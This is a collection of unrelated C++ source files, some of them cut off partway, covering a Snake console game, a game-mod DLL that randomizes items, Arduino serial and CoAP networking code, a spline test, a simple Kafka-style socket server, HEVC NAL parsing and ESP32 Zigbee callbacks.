    "//Asad Ullah_L1F23BSCS 0225 B-11\r\n#include <iostream>\r\n#include <conio.h>   // For _kbhit() and _getch()\r\n#include <windows.h> // For Sleep()\r\n\r\nusing namespace std;\r\n\r\nconst int width = 20;\r\nconst int height = 20;\r\nenum Direction { STOP = 0, LEFT, RIGHT, UP, DOWN };\r\nDirection dir;\r\nint x, y, foodX, foodY, score;\r\nint tailX[100], tailY[100];\r\nint nTail;\r\nbool gameOver;\r\nvoid Setup() \r\n{\r\n    gameOver = false;\r\n    dir = STOP;\r\n    x = width / 2;\r\n    y = height / 2;\r\n    foodX = rand() % width;\r\n    foodY = rand() % height;\r\n    score = 0;\r\n}\r\nvoid Draw() \r\n{\r\n    system(\"cls\"); \r\n\r\n    for (int i = 0; i < width + 2; i++)\r\n        cout << \"#\";\r\n    cout << endl;\r\n\r\n    for (int i = 0; i < height; i++)\r\n    {\r\n        for (int j = 0; j < width; j++)\r\n        {\r\n            if (j == 0)\r\n                cout << \"#\";\r\n            if (i == y && j == x)\r\n                cout << \"O\"; // Snake head\r\n            else if (i == foodY && j == foodX)\r\n                cout << \"F\"; // Food\r\n            else\r\n            {\r\n                bool print = false;\r\n\r\n                for (int k = 0; k < nTail; k++) \r\n                {\r\n                    if (tailX[k] == j && tailY[k] == i) \r\n                    {\r\n                        cout << \"o\"; // Snake body\r\n                        print = true;\r\n                    }\r\n                }\r\n                if (!print)\r\n                    cout << \" \";\r\n            }\r\n\r\n            if (j == width - 1)\r\n                cout << \"#\";\r\n        }\r\n        cout << endl;\r\n    }\r\n\r\n    for (int i = 0; i < width + 2; i++)\r\n        cout << \"#\";\r\n    cout << endl;\r\n\r\n    cout << \"Score: \" << score << endl;\r\n}\r\nvoid Input() \r\n{\r\n    if (_kbhit()) \r\n    {\r\n        switch (_getch())\r\n        {\r\n        case 'a':\r\n            dir = LEFT;\r\n            break;\r\n        case 'd':\r\n            dir = RIGHT;\r\n            break;\r\n        case 'w':\r\n            dir = UP;\r\n            break;\r\n        case 's':\r\n            dir = DOWN;\r\n            break;\r\n        case 'x':\r\n            gameOver = true;\r\n            break;\r\n        }\r\n    }\r\n}\r\nvoid Logic() \r\n{\r\n    int prevX = tailX[0];\r\n    int prevY = tailY[0];\r\n    int prev2X, prev2Y;\r\n    tailX[0] = x;\r\n    tailY[0] = y;\r\n    for (int i = 1; i < nTail; i++) \r\n    {\r\n        prev2X = tailX[i];\r\n        prev2Y = tailY[i];\r\n        tailX[i] = prevX;\r\n        tailY[i] = prevY;\r\n        prevX = prev2X;\r\n        prevY = prev2Y;\r\n    }\r\n    switch (dir) \r\n    {\r\n    case LEFT:\r\n        x--;\r\n        break;\r\n    case RIGHT:\r\n        x++;\r\n        break;\r\n    case UP:\r\n        y--;\r\n        break;\r\n    case DOWN:\r\n        y++;\r\n        break;\r\n    default:\r\n        break;\r\n    }\r\n    if (x >= width) x = 0; else if (x < 0) x = width - 1;\r\n    if (y >= height) y = 0; else if (y < 0) y = height - 1;\r\n\r\n    for (int i = 0; i < nTail; i++)\r\n    {\r\n        if (tailX[i] == x && tailY[i] == y)\r\n            gameOver = true;\r\n    }\r\n\r\n    if (x == foodX && y == foodY) \r\n    {\r\n        score += 10;\r\n        foodX = rand() % width;\r\n        foodY = rand() % height;\r\n        nTail++;\r\n    }\r\n}\r\nint main()\r\n{\r\n    int x{}, speed{}, spd{};\r\n    cout << \"                 WELCOME \" << endl;\r\n    cout << \"              HUNGRY $NAKE  \" << endl;\r\n    cout << \"LETS PLAY:  \" << endl;\r\n    cout << \"Enter for game speed:\\n1.slow\\n2.medium\\n3.fast\" << endl;\r\n    cin >> speed;\r\n    if (speed == 1)\r\n    {\r\n        spd = 500;\r\n    }\r\n    else if (speed == 2)\r\n    {\r\n        spd = 100;\r\n    }\r\n    else if (speed == 3)\r\n    {\r\n        spd = 0;\r\n    }\r\n\r\n\r\n    cout << \"         Loading....      \";\r\n    for (int i = 0; i < 10; i++)\r\n    {\r\n        cout << \". \";\r\n        Sleep(500);\r\n    }\r\n    system(\"clear\");\r\n    Setup();\r\n    while (!gameOver) {\r\n        Draw();\r\n        Input();\r\n        Logic();\r\n        Sleep(spd);\r\n\r\n    }\r\n    return 0;\r\n}\r\n",
    "\ufeff//clang-format on\n#include <fcntl.h>\n#include <io.h>\n// clang-format of\n#include <Windows.h>\n#include <stdint.h>\n#include <stdio.h>\n\n#include <chrono>\n#include <cstdint>\n#include <cstdio>\n#include <exception>\n#include <thread>\n\n#include \"config.h\"\n#include \"er.h\"\n#include \"hooks.h\"\n#include \"include/logger.h\"\n#include \"include/misc.h\"\n#include \"items.h\"\n#include \"logger.h\"\n#include \"randomizer.h\"\n\nvoid openConsole() {\n    if (AllocConsole()) {\n        SetConsoleTitle(\"Debug\");\n        HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);\n        INT hCrt = _open_osfhandle((intptr_t)hCon, _O_TEXT);\n        FILE* hf = _fdopen(hCrt, \"w\");\n        setvbuf(hf, NULL, _IONBF, 0);\n        *stdout = *hf;\n        freopen(\"CONOUT$\", \"w+t\", stdout);  // NOLINT\n        DWORD mode;\n        // ANSI support\n        GetConsoleMode(hCon, &mode);\n        mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;\n        SetConsoleMode(hCon, mode);\n    } else {\n        throw std::exception(\"Can not open console\");\n    }\n}\n\n// \u5404\u79cd\u521d\u59cb\u5316\nDWORD WINAPI start(LPVOID lpParam) {\n    auto& opt = Option::get();\n    auto& randomizer = Randomizer::get();\n    opt.load();\n    if (opt.debug_mode) {\n        openConsole();\n        system(\"chcp 65001\");\n    }\n    DBG(\"Simple CER Item Randomier v0.0.1\");\n    DBG(\"By hhhxiao (https://space.bilibili.com/34227664)\");\n    DBG(\"Mod Injected!\");\n    randomizer.init();\n    hooks::initilize();\n    ExitThread(0);\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n    switch (ul_reason_for_call) {\n        case DLL_PROCESS_ATTACH:\n            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)start, hModule, NULL, NULL);\n            DisableThreadLibraryCalls(hModule);\n        case DLL_PROCESS_DETACH:\n        default:\n            break;\n    }\n    return TRUE;\n}\n",
    "#include \"SerialClass.h\"\n\n#ifdef HAS_USB_SERIAL\nSerialClass::SerialClass(Serial_ & port)\n{\n\tUSBport=&port;\n\tHWport=NULL;\n\tinit();\n}\n\n#endif\n\n\nSerialClass::SerialClass(HardwareSerial & port)\n{\n\tHWport=&port;\n\t#ifdef HAS_USB_SERIAL\n\tUSBport=NULL;\n\t#endif\n\tinit();\n}\n\nvoid SerialClass::init(void)\n{\n\n}\n\nSerialClass::operator bool()\n{\n\tbool bActive=HWport;\n\n\t#ifdef HAS_USB_SERIAL\n\tif (!bActive)\n\t{\n\t\t/*\n\t\t * Windows: SerialUSB becomes true when connection is established\n\t\t *          but stays true when USB connection is closed\n\t\t * \t\t\tdtr() becomes false when USB connection is closed\n\t\t * Linux:   SerialUSB represents the connection state of an\n\t\t *          USB serial port. no issues\n\t\t * \n\t\t * Issue:\tA cakk to USBPort costs 10 ms , use dtr() instead\n\t\t */ \n\t\tbActive=*USBport;\n\t\tif (bActive)\n\t\t\tbActive=USBport->dtr();\n\t}\n\t#endif\n\treturn bActive;\n}\n\nvoid SerialClass::begin(unsigned long baud, uint16_t config)\n{\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tHWport->begin(baud,config);\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tUSBport->begin(baud,config);\n\t}\t// CDC-Serial\n\t#endif\n}\n\nvoid SerialClass::end()\n{\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tHWport->end();\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tUSBport->end();\n\t}\t// CDC-Serial\n\t#endif\n}\n\nint\tSerialClass::available(void)\n{\n\tint cnt=0;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tcnt=HWport->available();\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tcnt=USBport->available();\n\t}\t// CDC-Serial\n\t#endif\n\treturn cnt;\n}\n\nint SerialClass::peek(void)\n{\n\tint next_char=-1;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tnext_char=HWport->peek();\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tnext_char=USBport->peek();\n\t}\t// CDC-Serial\n\t#endif\n\treturn next_char;\n}\n\nint SerialClass::read(void)\n{\n\tint next_char=-1;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tnext_char=HWport->read();\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tnext_char=USBport->read();\n\t}\t// CDC-Serial\n\t#endif\n\treturn next_char;\n}\n\nint SerialClass::availableForWrite(void)\n{\n\tint cnt=0;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tcnt=HWport->availableForWrite();\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tcnt=USBport->availableForWrite();\n\t}\t// CDC-Serial\n\t#endif\n\treturn cnt;\n}\n\nvoid SerialClass::flush(void)\n{\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tHWport->flush();\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tUSBport->flush();\n\t}\t// CDC-Serial\n\t#endif\n}\n\nsize_t SerialClass::write(uint8_t c)\n{\n\tint cnt=0;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tcnt=HWport->write(c);\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tcnt=USBport->write(c);\n\t}\t// CDC-Serial\n\t#endif\n\treturn cnt;\n}\n\nsize_t SerialClass::write(const uint8_t *buffer, size_t size)\n{\n\tint cnt=0;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tcnt=HWport->write(buffer,size);\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tcnt=USBport->write(buffer,size);\n\t}\t// CDC-Serial\n\t#endif\n\treturn cnt;\n}\n\nsize_t SerialClass::readBytes( char *buffer, size_t length)\n{\n\tint cnt=0;\n\tif (HWport)\n\t{\t// HardwareSerial\n\t\tcnt=HWport->readBytes(buffer,length);\n\t}\t// HardwareSerial\n\t#ifdef HAS_USB_SERIAL\n\telse\n\t{\t// CDC-Serial\n\t\tcnt=USBport->readBytes(buffer,length);\n\t}\t// CDC-Serial\n\t#endif\n\treturn cnt;\n}\n\nint32_t SerialClass::readBreak()\n{\n\tint32_t time=0;\n\t#ifdef HAS_USB_SERIAL\n\tif (!HWport)\n\t{\t// CDC-Serial\n\t\ttime=USBport->readBreak();\n\t}\t// CDC-Serial\n\t#endif\n\treturn time;\n}\n\nbool SerialClass::dtr(void)\n{\n\tbool bDTR=true;\n\t#ifdef HAS_USB_SERIAL\n\tif (!HWport)\n\t{\t// CDC-Serial\n\t\tbDTR=USBport->dtr();\n\t}\t// CDC-Serial\n\t#endif\n\treturn bDTR;\n}\n\nbool SerialClass::rts(void)\n{\n\tbool bRTS=true;\n\t#ifdef HAS_USB_SERIAL\n\tif (!HWport)\n\t{\t// CDC-Serial\n\t\tbRTS=USBport->rts();\n\t}\t// CDC-Serial\n\t#endif\n\treturn bRTS;\n}\n",
    "#include \"coap-simple.h\"\n#include \"Arduino.h\"\n\n#define LOGGING\n\nvoid CoapPacket::addOption(uint8_t number, uint8_t length, uint8_t *opt_payload)\n{\n    options[optionnum].number = number;\n    options[optionnum].length = length;\n    options[optionnum].buffer = opt_payload;\n\n    ++optionnum;\n}\n\n\nCoap::Coap(\n    UDP& udp,\n    int coap_buf_size  /* default value is COAP_BUF_MAX_SIZE */\n) {\n    this->_udp = &udp;\n    this->coap_buf_size = coap_buf_size;\n    this->tx_buffer = new uint8_t[this->coap_buf_size];\n    this->rx_buffer = new uint8_t[this->coap_buf_size];\n}\n\nCoap::~Coap() {\n    if (this->tx_buffer != NULL)\n      delete[] this->tx_buffer;\n\n    if (this->rx_buffer != NULL)\n      delete[] this->rx_buffer;\n}\n\nbool Coap::start() {\n    this->start(COAP_DEFAULT_PORT);\n    return true;\n}\n\nbool Coap::start(int port) {\n    this->_udp->begin(port);\n    return true;\n}\n\nuint16_t Coap::sendPacket(CoapPacket &packet, IPAddress ip) {\n    return this->sendPacket(packet, ip, COAP_DEFAULT_PORT);\n}\n\nuint16_t Coap::sendPacket(CoapPacket &packet, IPAddress ip, int port) {\n    uint8_t *p = this->tx_buffer;\n    uint16_t running_delta = 0;\n    uint16_t packetSize = 0;\n\n    // make coap packet base header\n    *p = 0x01 << 6;\n    *p |= (packet.type & 0x03) << 4;\n    *p++ |= (packet.tokenlen & 0x0F);\n    *p++ = packet.code;\n    *p++ = (packet.messageid >> 8);\n    *p++ = (packet.messageid & 0xFF);\n    p = this->tx_buffer + COAP_HEADER_SIZE;\n    packetSize += 4;\n\n    // make token\n    if (packet.token != NULL && packet.tokenlen <= 0x0F) {\n        memcpy(p, packet.token, packet.tokenlen);\n        p += packet.tokenlen;\n        packetSize += packet.tokenlen;\n    }\n\n    // make option header\n    for (int i = 0; i < packet.optionnum; i++)  {\n        uint32_t optdelta;\n        uint8_t len, delta;\n\n        if (packetSize + 5 + packet.options[i].length >= coap_buf_size) {\n            return 0;\n        }\n        optdelta = packet.options[i].number - running_delta;\n        COAP_OPTION_DELTA(optdelta, &delta);\n        COAP_OPTION_DELTA((uint32_t)packet.options[i].length, &len);\n\n        *p++ = (0xFF & (delta << 4 | len));\n        if (delta == 13) {\n            *p++ = (optdelta - 13);\n            packetSize++;\n        } else if (delta == 14) {\n            *p++ = ((optdelta - 269) >> 8);\n            *p++ = (0xFF & (optdelta - 269));\n            packetSize+=2;\n        } if (len == 13) {\n            *p++ = (packet.options[i].length - 13);\n            packetSize++;\n        } else if (len == 14) {\n            *p++ = (packet.options[i].length >> 8);\n            *p++ = (0xFF & (packet.options[i].length - 269));\n            packetSize+=2;\n        }\n\n        memcpy(p, packet.options[i].buffer, packet.options[i].length);\n        p += packet.options[i].length;\n        packetSize += packet.options[i].length + 1;\n        running_delta = packet.options[i].number;\n    }\n\n    // make payload\n    if (packet.payloadlen > 0) {\n        if ((packetSize + 1 + packet.payloadlen) >= coap_buf_size) {\n            return 0;\n        }\n        *p++ = 0xFF;\n        memcpy(p, packet.payload, packet.payloadlen);\n        packetSize += 1 + packet.payloadlen;\n    }\n\n    _udp->beginPacket(ip, port);\n    _udp->write(this->tx_buffer, packetSize);\n    _udp->endPacket();\n\n    return packet.messageid;\n}\n\nuint16_t Coap::get(IPAddress ip, int port, const char *url) {\n    return this->send(ip, port, url, COAP_CON, COAP_GET, NULL, 0, NULL, 0);\n}\n\nuint16_t Coap::put(IPAddress ip, int port, const char *url, const char *payload) {\n    return this->send(ip, port, url, COAP_CON, COAP_PUT, NULL, 0, (uint8_t *)payload, strlen(payload));\n}\n\nuint16_t Coap::put(IPAddress ip, int port, const char *url, const char *payload, size_t payloadlen) {\n    return this->send(ip, port, url, COAP_CON, COAP_PUT, NULL, 0, (uint8_t *)payload, payloadlen);\n}\n\nuint16_t Coap::post(IPAddress ip, int port, const char *url, const char *payload) {\n    return this->send(ip, port, url, COAP_NONCON, COAP_POST, NULL, 0, (uint8_t *)payload, strlen(payload));\n}\n\nuint16_t Coap::post(IPAddress ip, int port, const char *url, const char *payload, size_t payloadlen) {\n    return this->send(ip, port, url, COAP_NONCON, COAP_POST, NULL, 0, (uint8_t *)payload, payloadlen);\n}\n\nuint16_t Coap::send(IPAddress ip, int port, const char *url, COAP_TYPE type, COAP_METHOD method, const uint8_t *token, uint8_t tokenlen, const uint8_t *payload, size_t payloadlen) {\n    return this->send(ip, port, url, type, method, token, tokenlen, payload, payloadlen, COAP_NONE);\n}\n\nuint16_t Coap::send(IPAddress ip, int port, const char *url, COAP_TYPE type, COAP_METHOD method, const uint8_t *token, uint8_t tokenlen, const uint8_t *payload, size_t payloadlen, COAP_CONTENT_TYPE content_type) {\n    return this->send(ip, port, url, type, method, token, tokenlen, payload, payloadlen, content_type, rand());\n}\n\nuint16_t Coap::send(IPAddress ip, int port, const char *url, COAP_TYPE type, COAP_METHOD method, const uint8_t *token, uint8_t tokenlen, const uint8_t *payload, ",
    "#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include \"piecewise_spline.h\"\n\nint main()\n{\n    std::vector<double> breaks = {0.0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.0};\n    std::vector<Eigen::VectorXd> knots = {\n        Eigen::Vector3d(5.22, 9.60, -8.85),\n        Eigen::Vector3d(8.92, -1.87, 4.30),\n        Eigen::Vector3d(6.40, -4.81, 5.55),\n        Eigen::Vector3d(8.76, -9.99, 5.52),\n        Eigen::Vector3d(5.49, -9.63, -3.81),\n        Eigen::Vector3d(-1.04, 2.45, -3.17),\n        Eigen::Vector3d(-4.57, -2.53, 8.27)};\n\n    // \u96f6\u9636\u4fdd\u6301\u5668\u6d4b\u8bd5\n    PiecewiseSpline q0 = PiecewiseSpline::ZeroOrderHold(breaks, knots);\n\n    // \u7ebf\u6027\u63d2\u503c\u6d4b\u8bd5\n    PiecewiseSpline q1 = PiecewiseSpline::LinearSpline(breaks, knots);\n\n    // \u4e09\u6b21\u6837\u6761\u5dee\u503c\u6d4b\u8bd5 Natural Condition\n    PiecewiseSpline q3_natural = PiecewiseSpline::CubicSpline(breaks, knots);\n\n    // \u4e09\u6b21\u6837\u6761\u5dee\u503c\u6d4b\u8bd5 NotAKnot Condition\n    PiecewiseSpline q3_not_a_knot = PiecewiseSpline::CubicSpline(breaks, knots, false);\n\n    // \u4e09\u6b21\u6837\u6761\u5dee\u503c\u6d4b\u8bd5 Clamp Condition\n    Eigen::VectorXd clamped_start = Eigen::Vector3d(0, 0, 0);\n    Eigen::VectorXd clamped_end = Eigen::Vector3d(0, 0, 0);\n    PiecewiseSpline q3_clamp = PiecewiseSpline::CubicSpline(breaks, knots, clamped_start, clamped_end);\n\n    // begin test\n    int num_samps = 1000;\n    double start = breaks[0], end = breaks[breaks.size() - 1];\n\n    std::string filename0 = \"../log/knots.csv\";\n    std::string filename1 = \"../log/element0.csv\";\n    std::string filename2 = \"../log/element1.csv\";\n    std::string filename3 = \"../log/element2.csv\";\n\n    std::ofstream file0(filename0), file1(filename1), file2(filename2), file3(filename3);\n\n    // load knots\n    for (int i = 0; i < breaks.size(); ++i)\n    {\n\n        file0 << breaks[i] << \",\" << knots[i](0) << \",\" << knots[i](1) << \",\" << knots[i](2) << std::endl;\n    }\n    // load spline data\n    for (int i = 0; i < num_samps; ++i)\n    {\n        double step = (end - start) / (num_samps - 1);\n        double samp = start + i * step;\n\n        file1 << samp << \",\"\n              << q0.value(samp)(0) << \",\"\n              << q1.value(samp)(0) << \",\"\n              << q3_natural.value(samp)(0) << \",\"\n              << q3_not_a_knot.value(samp)(0) << \",\"\n              << q3_clamp.value(samp)(0) << std::endl;\n        file2 << samp << \",\"\n              << q0.value(samp)(1) << \",\"\n              << q1.value(samp)(1) << \",\"\n              << q3_natural.value(samp)(1) << \",\"\n              << q3_not_a_knot.value(samp)(1) << \",\"\n              << q3_clamp.value(samp)(1) << std::endl;\n        file3 << samp << \",\"\n              << q0.value(samp)(2) << \",\"\n              << q1.value(samp)(2) << \",\"\n              << q3_natural.value(samp)(2) << \",\"\n              << q3_not_a_knot.value(samp)(2) << \",\"\n              << q3_clamp.value(samp)(2) << std::endl;\n    }\n\n    file0.close();\n    file1.close();\n    file2.close();\n    file3.close();\n\n    return 0;\n}\n",
    "#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <string>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n\nstruct Payload {\n    unsigned int message_size;\n    unsigned int correlation_id;\n    std::string header;\n    std::string body;\n};\n\nint main(int argc, char* argv[]) {\n    // Disable output buffering\n    std::cout << std::unitbuf;\n    std::cerr << std::unitbuf;\n\n    int server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_fd < 0) {\n        std::cerr << \"Failed to create server socket: \" << std::endl;\n        return 1;\n    }\n\n    // Since the tester restarts your program quite often, setting SO_REUSEADDR\n    // ensures that we don't run into 'Address already in use' errors\n    int reuse = 1;\n    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {\n        close(server_fd);\n        std::cerr << \"setsockopt failed: \" << std::endl;\n        return 1;\n    }\n\n    struct sockaddr_in server_addr{};\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = INADDR_ANY;\n    server_addr.sin_port = htons(9092);\n\n    if (bind(server_fd, reinterpret_cast<struct sockaddr*>(&server_addr), sizeof(server_addr)) != 0) {\n        close(server_fd);\n        std::cerr << \"Failed to bind to port 9092\" << std::endl;\n        return 1;\n    }\n\n    int connection_backlog = 5;\n    if (listen(server_fd, connection_backlog) != 0) {\n        close(server_fd);\n        std::cerr << \"listen failed\" << std::endl;\n        return 1;\n    }\n\n    std::cout << \"Waiting for a client to connect...\\n\";\n\n    struct sockaddr_in client_addr{};\n    socklen_t client_addr_len = sizeof(client_addr);\n\n    // You can use print statements as follows for debugging, they'll be visible when running tests.\n    int client_fd = accept(server_fd, reinterpret_cast<struct sockaddr*>(&client_addr), &client_addr_len);\n    // std::cout <<\"DEBUG info: request payload: \" << payload.message_size << payload.request_api_key << payload.request_api_version << payload.correlation_id << payload.client_id << payload.TAG_BUFFER << std::endl;\n    std::cout << \"Client connected\\n\";\n    // read the request payload\n    std::byte buffer[1024];\n    ssize_t request_payload = read(client_fd,&buffer,sizeof(buffer));\n    char sentmsg[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // before recv\n    if(request_payload==-1){\n        std::cerr<<\"Failed recv\";\n    }\n    else{\n        int j=4;\n        for(int i=8;i<12;i++)\n        {\n            sentmsg[j]=(int)buffer[i];\n            j++;\n        }\n            \n    }\n    write(client_fd, &sentmsg, sizeof(sentmsg));\n \n    std::cout << \"Client connected\\n\";\n    close(client_fd);\n\n    close(server_fd);\n    return 0;\n}\n\n\n",
    "/*--------------------------------------------------------------------------\nCopyright (c) 2013, The Linux Foundation. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above copyright\n      notice, this list of conditions and the following disclaimer in the\n      documentation and/or other materials provided with the distribution.\n    * Neither the name of The Linux Foundation nor\n      the names of its contributors may be used to endorse or promote\n      products derived from this software without specific prior written\n      permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNON-INFRINGEMENT ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR\nCONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\nEXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\nPROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;\nOR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\nWHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\nOTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF\nADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n--------------------------------------------------------------------------*/\n\n/*========================================================================\n\n                      O p e n M M\n         V i d e o   U t i l i t i e s\n\n*//** @file VideoUtils.cpp\n  This module contains utilities and helper routines.\n\n@par EXTERNALIZED FUNCTIONS\n\n@par INITIALIZATION AND SEQUENCING REQUIREMENTS\n  (none)\n\n*//*====================================================================== */\n\n/* =======================================================================\n\n                     INCLUDE FILES FOR MODULE\n\n========================================================================== */\n#include \"hevc_utils.h\"\n#include \"vidc_debug.h\"\n#include <string.h>\n#include <stdlib.h>\n#include <limits.h>\n#include <sys/time.h>\n#ifdef _ANDROID_\n#include <cutils/properties.h>\n#endif\n\n\n/* =======================================================================\n\n                DEFINITIONS AND DECLARATIONS FOR MODULE\n\nThis section contains definitions for constants, macros, types, variables\nand other items needed by this module.\n\n========================================================================== */\n\nHEVC_Utils::HEVC_Utils()\n{\n    initialize_frame_checking_environment();\n}\n\nHEVC_Utils::~HEVC_Utils()\n{\n}\n\n/***********************************************************************/\n/*\nFUNCTION:\nHEVC_Utils::initialize_frame_checking_environment\n\nDESCRIPTION:\nExtract RBSP data from a NAL\n\nINPUT/OUTPUT PARAMETERS:\nNone\n\nRETURN VALUE:\nboolean\n\nSIDE EFFECTS:\nNone.\n */\n/***********************************************************************/\nvoid HEVC_Utils::initialize_frame_checking_environment()\n{\n    m_forceToStichNextNAL = false;\n    m_au_data = false;\n    nalu_type = NAL_UNIT_INVALID;\n}\n\n/*===========================================================================\nFUNCTION:\nHEVC_Utils::iSNewFrame\n\nDESCRIPTION:\nReturns true if NAL parsing successfull otherwise false.\n\nINPUT/OUTPUT PARAMETERS:\n<In>\nbuffer : buffer containing start code or nal length + NAL units\nbuffer_length : the length of the NAL buffer\nstart_code : If true, start code is detected,\notherwise size nal length is detected\nsize_of_nal_length_field: size of nal length field\n<out>\nisNewFrame: true if the NAL belongs to a differenet frame\nfalse if the NAL belongs to a current frame\n\nRETURN VALUE:\nboolean  true, if nal parsing is successful\nfalse, if the nal parsing has errors\n\nSIDE EFFECTS:\nNone.\n===========================================================================*/\nbool HEVC_Utils::isNewFrame(OMX_BUFFERHEADERTYPE *p_buf_hdr,\n        OMX_IN OMX_U32 size_of_nal_length_field,\n        OMX_OUT OMX_BOOL &isNewFrame)\n{\n    OMX_IN OMX_U8 *buffer = p_buf_hdr->pBuffer;\n    OMX_IN OMX_U32 buffer_length = p_buf_hdr->nFilledLen;\n    byte bFirstSliceInPic = 0;\n\n    byte coef1=1, coef2=0, coef3=0;\n    uint32 pos = 0;\n    uint32 nal_len = buffer_length;\n    uint32 sizeofNalLengthField = 0;\n    uint32 zero_count;\n    boolean start_code = (size_of_nal_length_field==0)?true:false;\n\n    if (start_code) {\n        // Search start_code_prefix_one_3bytes (0x000001)\n        coef2 = buffer[pos++];\n        coef3 = buffer[pos++];\n\n        do {\n            if (pos >= buffer_length) {\n                DEBUG_PRINT_ERROR(\"ERROR: In %s() - line %d\", __func__, __LINE__);\n                return false;\n           ",
    "// Copyright 2024 Espressif Systems (Shanghai) PTE LTD\n// Modifications Copyright 2024 Skye Harris\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include <Arduino.h>\n#include \"Zigbee/zigbee.h\"\n\n// Callback functions to main application logic\nvoid (*onCreateClustersCallback)(esp_zb_cluster_list_t *clusterList) = NULL;\nesp_err_t (*onAttributeUpdatedCallback)(const esp_zb_zcl_set_attr_value_message_t *message);\nesp_err_t (*onCustomClusterCommandCallback)(const esp_zb_zcl_custom_cluster_command_message_t *message);\nvoid (*onIdentifyCallback)(bool isIdentifying) = NULL;\nvoid (*onInitCallback)() = NULL;\n\n// Cluster Action callback\nstatic esp_err_t onZigbeeAction(esp_zb_core_action_callback_id_t callback_id, const void *message) {\n    esp_err_t ret = ESP_OK;\n\n    switch (callback_id) {\n        case ESP_ZB_CORE_SET_ATTR_VALUE_CB_ID:\n            log_i(\"Receive Zigbee action ESP_ZB_CORE_SET_ATTR_VALUE_CB_ID\");\n\n            if (onAttributeUpdatedCallback != NULL) {\n                ret = onAttributeUpdatedCallback((esp_zb_zcl_set_attr_value_message_t *)message);\n            }\n            break;\n\n        case ESP_ZB_CORE_CMD_CUSTOM_CLUSTER_REQ_CB_ID:\n            log_i(\"Receive Zigbee action ESP_ZB_CORE_CMD_CUSTOM_CLUSTER_REQ_CB_ID\");\n\n            if (onCustomClusterCommandCallback != NULL) {\n                ret = onCustomClusterCommandCallback((esp_zb_zcl_custom_cluster_command_message_t *)message);\n            }\n            break;\n\n        case ESP_ZB_CORE_CMD_READ_ATTR_RESP_CB_ID:\n            log_i(\"Receive Zigbee action ESP_ZB_CORE_CMD_READ_ATTR_RESP_CB_ID\");\n            break;\n\n        case ESP_ZB_CORE_REPORT_ATTR_CB_ID:\n            log_i(\"Receive Zigbee action ESP_ZB_CORE_REPORT_ATTR_CB_ID\");\n            break;\n\n        case ESP_ZB_CORE_CMD_REPORT_CONFIG_RESP_CB_ID:\n            log_i(\"Receive Zigbee action ESP_ZB_CORE_CMD_REPORT_CONFIG_RESP_CB_ID\");\n            break;\n\n        default:\n       